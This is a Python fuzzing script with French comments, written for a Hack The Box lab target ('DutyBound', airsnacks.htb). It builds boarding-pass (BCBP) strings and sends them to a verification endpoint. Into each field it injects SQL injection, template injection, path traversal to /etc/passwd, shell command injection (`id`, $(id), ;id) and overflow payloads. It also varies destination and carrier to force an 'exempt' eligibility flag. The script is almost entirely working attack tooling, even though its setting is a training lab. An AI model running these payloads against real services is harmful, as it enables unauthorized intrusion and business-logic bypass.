#!/usr/bin/env python3
"""
BCBP crafter + fuzzer pour DutyBound (HTB).
Repart du boarding pass connu-bon et mute des champs cibles pour
detecter injection (SQLi / SSTI / traversal / cmd) ou changement de
logique d'eligibilite (regime / exempt).

Usage:
  python3 bcbp_fuzz.py --target https://airsnacks.htb --cookie 'session=...'
  python3 bcbp_fuzz.py --target https://airsnacks.htb --cookie '...' --mode logic
Options:
  --mode inject   (defaut) injecte des payloads dans chaque champ mutable
  --mode logic    varie dest/carrier/status pour forcer exempt=true
  --only NAME     ne fuzz qu'un seul champ (passenger,pnr,from,to,carrier,tail)
"""
import argparse, json, sys, copy
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    sys.exit("pip install requests")

# --- Pass connu-bon (a renvoye un eligibility_token). Reference fixe. ---
BASE = "M1DOE/JOHN            EABC123 CDGHTBAF 0123 365Y012A0001 114>60B1WW6319BAF 03057"

# (nom_champ, index_debut, longueur) reperes sur la chaine de reference.
# Ajuste les offsets si ta chaine de reference differe.
FIELDS = {
    "passenger": (2, 20),   # DOE/JOHN + padding
    "pnr":       (23, 7),   # ABC123
    "from":      (30, 3),   # CDG
    "to":        (33, 3),   # HTB  <-- celui qui remonte dans dest
    "carrier":   (36, 3),   # AF
    "seat":      (48, 4),   # 012A
    "seq":       (52, 5),   # 0001
}
# La "queue" (apres '>') = donnees conditionnelles / airline-specific = zone libre.
TAIL_MARK = ">"

INJECT = [
    "'", "''", "' OR '1'='1", "'||'", "');--", "\"",
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "../../../../etc/passwd", "....//....//etc/passwd",
    "`id`", "$(id)", ";id", "|id",
    "A"*300,            # overflow / longueur
    "\x00", "%00",
]

LOGIC = {   # champ -> valeurs a essayer pour changer l'eligibilite
    "to":      ["JFK","LHR","DXB","SIN","HKG","AMS","INT","XXX"],
    "carrier": ["BA ","LH ","EK ","AA ","QF "],
}

def set_field(s, start, length, val):
    val = (val + " "*length)[:length] if len(val) <= length else val  # deborde si plus long
    return s[:start] + val + s[start+length:]

def mutate_tail(s, payload):
    i = s.find(TAIL_MARK)
    return s if i < 0 else s[:i+1] + payload

def send(target, cookie, raw):
    h = {"Content-Type":"application/json"}
    if cookie: h["Cookie"] = cookie
    try:
        r = requests.post(target.rstrip("/") + "/checkout/boarding-pass/verify",
                          headers=h, data=json.dumps({"raw": raw}),
                          verify=False, timeout=15)
        return r.status_code, r.text[:600]
    except Exception as e:
        return -1, str(e)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--mode", choices=["inject","logic"], default="inject")
    ap.add_argument("--only")
    a = ap.parse_args()

    base_sc, base_body = send(a.target, a.cookie, BASE)
    print(f"[baseline] {base_sc}  {base_body}\n{'='*70}")

    def report(label, raw):
        sc, body = send(a.target, a.cookie, raw)
        flag = ""
        if sc != base_sc: flag += " [STATUS!=]"
        if body != base_body: flag += " [BODY!=]"
        for marker in ("49","root:","sql","syntax","traceback","exempt\":true","Internal"):
            if marker.lower() in body.lower(): flag += f" [{marker}]"
        print(f"[{label:28}] {sc}{flag}\n    {body[:200]}")

    if a.mode == "inject":
        for name,(start,length) in FIELDS.items():
            if a.only and name != a.only: continue
            for p in INJECT:
                report(f"{name}:{p[:12]}", set_field(BASE,start,length,p))
        if not a.only or a.only=="tail":
            for p in INJECT:
                report(f"tail:{p[:12]}", mutate_tail(BASE,p))
    else:  # logic
        for name,vals in LOGIC.items():
            start,length = FIELDS[name]
            for v in vals:
                report(f"{name}={v.strip()}", set_field(BASE,start,length,v))

if __name__ == "__main__":
    main()
